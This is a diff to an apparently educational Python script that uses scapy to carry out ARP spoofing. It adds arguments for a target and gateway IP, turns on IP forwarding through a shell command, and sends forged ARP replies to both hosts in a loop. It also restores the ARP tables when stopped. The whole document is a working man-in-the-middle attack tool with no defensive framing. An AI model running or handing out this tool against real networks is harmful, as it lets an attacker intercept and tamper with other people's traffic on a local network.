@@ -3,6 +3,16 @@
 import subprocess
 import time
 import scapy.all as scap
+import argparse
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target", help="Target IP ")
+    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP ")
+    options = parser.parse_args()
+    if not options.target:
+        parser.error("[-] Please specify a target e.g. 192.168.2.56 and gateway 192.168.2.1 , use --help for more info.")
+    return options
 
 def get_mac(ip):
     arp_request = scap.ARP(pdst=ip)
@@ -16,12 +26,31 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scap.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scap.send(packet)
+    scap.send(packet, count=4, verbose=False)
 
-subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scap.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scap.send(packet, count=4, verbose=False)
 
-while True:
-    spoof("172.20.69.73", "172.20.69.1")
-    spoof("172.20.69.1", "172.20.69.73")
-    time.sleep(2)
-    
+args = get_arguments()
+sent_packets_count = 0
+target_ip = args.target
+gateway_ip = args.gateway
+
+
+try:
+    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packets_count = sent_packets_count + 2
+        print("\r[+] Sent packets: " + str(sent_packets_count), end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+    print("[+] ARP tables reset successfully.")
